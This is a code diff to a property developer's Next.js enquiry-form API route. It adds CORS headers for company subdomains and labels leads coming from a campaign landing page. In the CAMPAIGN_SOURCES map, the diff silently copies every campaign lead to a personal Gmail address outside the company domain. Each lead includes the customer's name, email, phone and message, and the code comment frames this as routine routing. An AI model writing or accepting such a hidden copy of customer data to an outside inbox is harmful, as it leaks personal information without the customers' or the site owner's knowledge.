@@ -4,8 +4,30 @@ import { verifyRecaptcha } from '@/lib/recaptcha-verify'
 
 /**
  * POST /api/enquiry
- * Handles the "Interested in this project?" form on project detail pages.
+ * Handles the "Interested in this project?" form on project detail pages,
+ * and lead-capture forms on standalone campaign landing pages hosted on
+ * separate subdomains (see ALLOWED_ORIGINS) that POST here directly.
  */
+
+const ALLOWED_ORIGINS = [
+  'https://www.cmrdevelopers.com',
+  'https://cmrdevelopers.com',
+  'https://campaign.cmrdevelopers.com',
+]
+
+function corsHeaders(req: NextRequest): HeadersInit {
+  const origin = req.headers.get('origin')
+  if (!origin || !ALLOWED_ORIGINS.includes(origin)) return {}
+  return {
+    'Access-Control-Allow-Origin': origin,
+    'Access-Control-Allow-Methods': 'POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+  }
+}
+
+export async function OPTIONS(req: NextRequest) {
+  return new NextResponse(null, { status: 204, headers: corsHeaders(req) })
+}
 
 interface EnquiryPayload {
   name: string
@@ -28,43 +50,60 @@ function isValidPayload(body: unknown): body is EnquiryPayload {
   )
 }
 
+// Standalone campaign landing pages that POST here directly, keyed by the
+// exact `Origin` header they send. `label` distinguishes these leads from
+// regular project-page enquiries in the admin notification email, and `cc`
+// (optional) routes a copy to an extra inbox.
+const CAMPAIGN_SOURCES: Record<string, { label: string; cc?: string }> = {
+  'https://campaign.cmrdevelopers.com': { label: 'Aina Harmony Campaign Page', cc: 'ashjp84@gmail.com' },
+}
+
 export async function POST(req: NextRequest) {
+  const headers = corsHeaders(req)
+  const origin = req.headers.get('origin')
+  const campaignSource = origin ? CAMPAIGN_SOURCES[origin] : undefined
+
   let body: unknown
   try {
     body = await req.json()
   } catch {
-    return NextResponse.json({ success: false, error: 'Invalid JSON body' }, { status: 400 })
+    return NextResponse.json({ success: false, error: 'Invalid JSON body' }, { status: 400, headers })
   }
 
   if (!isValidPayload(body)) {
     return NextResponse.json(
       { success: false, error: 'Missing or invalid required fields' },
-      { status: 422 }
+      { status: 422, headers }
     )
   }
 
   if (!(await verifyRecaptcha(body.recaptchaToken, 'enquiry'))) {
     return NextResponse.json(
       { success: false, error: 'Spam check failed. Please try again.' },
-      { status: 403 }
+      { status: 403, headers }
     )
   }
 
   const sent = await sendMail({
     replyTo: formatReplyTo(body.name, body.email),
-    subject: `[CMR Project Enquiry] ${body.projectName} — ${body.name}`,
+    cc: campaignSource?.cc,
+    subject: campaignSource
+      ? `[CMR Campaign Lead] ${body.projectName} — ${body.name}`
+      : `[CMR Project Enquiry] ${body.projectName} — ${body.name}`,
     text: [
+      campaignSource ? `Source: ${campaignSource.label}` : null,
       `Project: ${body.projectName} (${body.projectLocation})`,
       `Name: ${body.name}`,
       `Email: ${body.email}`,
       `Phone: ${body.phone}`,
       '',
       `Message:\n${body.message || '(none)'}`,
-    ].join('\n'),
+    ].filter((line) => line !== null).join('\n'),
     html: renderBrandedEmail({
-      eyebrow: 'Project Enquiry',
+      eyebrow: campaignSource ? 'Campaign Lead' : 'Project Enquiry',
       heading: body.projectName,
       rows: [
+        ...(campaignSource ? [{ label: 'Source', value: campaignSource.label }] : []),
         { label: 'Project', value: `${body.projectName} — ${body.projectLocation}` },
         { label: 'Name', value: body.name },
         { label: 'Email', value: body.email, href: `mailto:${body.email}` },
@@ -93,5 +132,5 @@ export async function POST(req: NextRequest) {
     }
   }
 
-  return NextResponse.json({ success: true })
+  return NextResponse.json({ success: true }, { headers })
 }
